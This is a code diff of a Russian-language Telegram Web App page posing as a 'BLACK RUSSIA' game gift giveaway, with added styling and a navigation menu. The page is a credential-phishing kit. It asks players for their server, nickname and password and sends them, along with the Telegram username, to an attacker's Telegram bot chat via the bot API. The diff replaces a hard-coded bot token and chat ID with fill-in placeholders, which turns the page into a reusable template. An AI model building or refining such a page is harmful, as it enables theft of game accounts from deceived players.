@@ -8,36 +8,129 @@
     <style>
         body {
             font-family: 'Arial', sans-serif;
-            background-color: #0a0a0a;
             color: #fff;
             margin: 0;
-            padding: 16px;
+            padding: 0;
             line-height: 1.5;
+            background: url('https://images.app.goo.gl/RbW2S') no-repeat center center fixed;
+            background-size: cover;
+            position: relative;
         }
+        
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: -1;
+        }
+        
         .container {
             max-width: 400px;
             margin: 0 auto;
-            background: #111;
-            border-radius: 12px;
-            padding: 20px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+            background: rgba(17, 17, 17, 0.9);
+            min-height: 100vh;
+            position: relative;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
         }
+        
+        /* Шапка с меню */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px;
+            background: rgba(0, 0, 0, 0.8);
+            position: relative;
+            border-bottom: 1px solid #ffcc00;
+        }
+        
+        .logo {
+            color: #ffcc00;
+            font-weight: bold;
+            font-size: 20px;
+            text-shadow: 0 0 5px rgba(255, 204, 0, 0.5);
+        }
+        
+        /* Бургер-меню */
+        .menu-btn {
+            width: 24px;
+            height: 24px;
+            position: relative;
+            cursor: pointer;
+            z-index: 100;
+        }
+        
+        .menu-btn span {
+            display: block;
+            width: 100%;
+            height: 3px;
+            background: #ffcc00;
+            margin: 4px 0;
+            transition: all 0.3s;
+            border-radius: 2px;
+        }
+        
+        /* Меню */
+        .menu {
+            position: fixed;
+            top: 0;
+            right: -250px;
+            width: 250px;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            z-index: 99;
+            padding: 70px 20px 20px;
+            transition: all 0.3s;
+            border-left: 2px solid #ffcc00;
+        }
+        
+        .menu.active {
+            right: 0;
+        }
+        
+        .menu-item {
+            color: #fff;
+            padding: 14px 0;
+            border-bottom: 1px solid #333;
+            cursor: pointer;
+            font-size: 16px;
+            transition: all 0.2s;
+        }
+        
+        .menu-item:hover {
+            color: #ffcc00;
+            padding-left: 10px;
+        }
+        
+        /* Основной контент */
+        .content {
+            padding: 16px;
+        }
+        
         h1 {
             color: #ffcc00;
             text-align: center;
             font-size: 22px;
             margin-bottom: 20px;
             text-transform: uppercase;
+            text-shadow: 0 0 5px rgba(255, 204, 0, 0.3);
         }
+        
         .form-group {
             margin-bottom: 16px;
         }
+        
         label {
             display: block;
             margin-bottom: 6px;
             font-weight: bold;
             color: #ddd;
         }
+        
         input, select {
             width: 100%;
             padding: 12px;
@@ -47,11 +140,7 @@
             color: #fff;
             font-size: 16px;
         }
-        .divider {
-            height: 1px;
-            background: #333;
-            margin: 20px 0;
-        }
+        
         .btn {
             width: 100%;
             padding: 14px;
@@ -64,82 +153,116 @@
             cursor: pointer;
             text-transform: uppercase;
             margin-top: 10px;
+            transition: all 0.2s;
         }
-        .notice {
-            font-size: 12px;
-            color: #999;
-            text-align: center;
-            margin-top: 20px;
+        
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 10px rgba(255, 204, 0, 0.3);
         }
+        
         .gift-list {
             margin-top: 24px;
         }
+        
         .gift-item {
-            background: #1a1a1a;
+            background: rgba(26, 26, 26, 0.7);
             border-radius: 8px;
             padding: 12px;
             margin-bottom: 12px;
+            border-left: 3px solid #ffcc00;
         }
+        
         .gift-title {
             color: #ffcc00;
             font-weight: bold;
             margin-bottom: 6px;
         }
+        
+        /* Оверлей при открытом меню */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 98;
+            display: none;
+        }
+        
+        .overlay.active {
+            display: block;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>BLACK RUSSIA | ПОДАРКИ</h1>
-        
-        <div class="form-group">
-            <label>Укажи сервер</label>
-            <select id="server" required>
-                <option value="" disabled selected>Выбери из списка</option>
-                <option value="Server 1">Server 1</option>
-                <option value="Server 2">Server 2</option>
-                <option value="Server 3">Server 3</option>
-            </select>
+        <!-- Шапка с меню -->
+        <div class="header">
+            <div class="logo">BLACK RUSSIA</div>
+            <div class="menu-btn" id="menuBtn">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
         </div>
         
-        <div class="form-group">
-            <label>Введи игровой ник</label>
-            <input type="text" id="nickname" placeholder="Имя_Фамилия" pattern="^[А-Яа-яЁёA-Za-z]+_[А-Яа-яЁёA-Za-z]+$" required>
+        <!-- Навигационное меню -->
+        <div class="menu" id="menu">
+            <div class="menu-item">НАЧАТЬ ИГРАТЬ</div>
+            <div class="menu-item">ДОНАТ</div>
+            <div class="menu-item">БАЗА ЗНАНИЙ</div>
+            <div class="menu-item">ФОРУМ</div>
+            <div class="menu-item">СМОТРИ БОЛЬШЕ</div>
         </div>
         
-        <div class="form-group">
-            <label>Введи пароль</label>
-            <input type="password" id="password" placeholder="Твой пароль" required>
-        </div>
+        <!-- Оверлей -->
+        <div class="overlay" id="overlay"></div>
         
-        <div class="divider"></div>
-        
-        <div class="form-group">
-            <label>Я не робот</label>
-            <input type="checkbox" id="not-robot" required>
-        </div>
-        
-        <button class="btn" id="submitBtn">Получить подарок</button>
-        
-        <div class="notice">
-            Нажимая "Получить подарок", вы соглашаетесь с правилами акции
-        </div>
-        
-        <div class="gift-list">
-            <h3>ЧТО МОЖНО ПОЛУЧИТЬ?</h3>
+        <!-- Основной контент -->
+        <div class="content">
+            <h1>ПОЛУЧИТЬ ПОДАРОК</h1>
             
-            <div class="gift-item">
-                <div class="gift-title">BLACK PASS</div>
-                <div>Эксклюзивный доступ к премиум-наградам сезона!</div>
+            <div class="form-group">
+                <label>Укажи сервер</label>
+                <select id="server" required>
+                    <option value="" disabled selected>Выбери из списка</option>
+                    <option value="Server 1">Server 1</option>
+                    <option value="Server 2">Server 2</option>
+                    <option value="Server 3">Server 3</option>
+                </select>
             </div>
             
-            <div class="gift-item">
-                <div class="gift-title">Увеличение слогов</div>
-                <div>+10 слотов для транспорта в гараже</div>
+            <div class="form-group">
+                <label>Введи игровой ник</label>
+                <input type="text" id="nickname" placeholder="Имя_Фамилия" pattern="^[А-Яа-яЁёA-Za-z]+_[А-Яа-яЁёA-Za-z]+$" required>
             </div>
             
-            <div class="gift-item">
-                <div class="gift-title">100 BC</div>
-                <div>Игровая валюта для покупок</div>
+            <div class="form-group">
+                <label>Введи пароль</label>
+                <input type="password" id="password" placeholder="Твой пароль" required>
+            </div>
+            
+            <button class="btn" id="submitBtn">Получить подарок</button>
+            
+            <div class="gift-list">
+                <h3>ЧТО ТЕБЯ ЖДЁТ В BLACK RUSSIA?</h3>
+                
+                <div class="gift-item">
+                    <div class="gift-title">BLACK PASS</div>
+                    <div>Эксклюзивный доступ к премиум-наградам сезона!</div>
+                </div>
+                
+                <div class="gift-item">
+                    <div class="gift-title">Увеличение слогов</div>
+                    <div>+10 слотов для транспорта в гараже</div>
+                </div>
+                
+                <div class="gift-item">
+                    <div class="gift-title">100 BC</div>
+                    <div>Игровая валюта для покупок</div>
+                </div>
             </div>
         </div>
     </div>
@@ -148,19 +271,31 @@
         const tg = window.Telegram.WebApp;
         tg.expand();
         
+        // Бургер-меню
+        const menuBtn = document.getElementById('menuBtn');
+        const menu = document.getElementById('menu');
+        const overlay = document.getElementById('overlay');
+        
+        menuBtn.addEventListener('click', function() {
+            menu.classList.toggle('active');
+            overlay.classList.toggle('active');
+            document.body.style.overflow = menu.classList.contains('active') ? 'hidden' : 'auto';
+        });
+        
+        overlay.addEventListener('click', function() {
+            menu.classList.remove('active');
+            overlay.classList.remove('active');
+            document.body.style.overflow = 'auto';
+        });
+        
+        // Обработка формы
         document.getElementById('submitBtn').addEventListener('click', function() {
             const server = document.getElementById('server').value;
             const nickname = document.getElementById('nickname').value;
             const password = document.getElementById('password').value;
-            const isNotRobot = document.getElementById('not-robot').checked;
-            
-            if (!isNotRobot) {
-                alert('Подтвердите, что вы не робот!');
-                return;
-            }
             
             if (!/^[А-Яа-яЁёA-Za-z]+_[А-Яа-яЁёA-Za-z]+$/.test(nickname)) {
-                alert('Ник должен быть в формате: Имя_Фамилия');
+                tg.showAlert('Ник должен быть в формате: Имя_Фамилия');
                 return;
             }
             
@@ -170,8 +305,8 @@
                           `🔑 Пароль: ${password}\n` +
                           `От: @${tg.initDataUnsafe.user?.username || 'аноним'}`;
             
-            const botToken = '7808613132:AAED4eckVrpvNo9mraL3LcOSgzrnUCXbvQI';
-            const chatId = '-4927394143';
+            const botToken = 'ВАШ_BOT_TOKEN';
+            const chatId = 'ВАШ_CHAT_ID';
             
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
                 .then(response => response.json())
